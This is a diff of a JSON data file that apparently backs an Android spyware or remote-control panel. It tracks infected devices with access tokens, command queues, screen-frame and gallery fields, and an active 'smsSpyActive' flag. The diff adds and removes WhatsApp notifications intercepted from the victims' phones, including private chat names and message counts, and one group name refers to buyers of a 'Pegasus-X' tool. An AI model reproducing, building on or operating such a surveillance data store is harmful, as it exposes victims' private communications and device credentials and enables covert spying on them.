@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775046566736,
+    "lastSeen": 1775046569858,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775046568522,
+    "lastSeen": 1775046571451,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15850 pesan dari 10 chat",
+        "time": "01/04 20:29",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775046572129
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎All Buyer Pegasus-X ( No Update ) (248 pesan): ~ DEWANGGA",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1775045837233
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13541 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar presiden, peri, hati, dan huruf N.Gambar nasi, huruf B, per, dan orang duduk.Gambar mi, orang bermain ski, dan huruf N.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 20:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775045837222
       }
     ],
     "galleryPhotos": [],
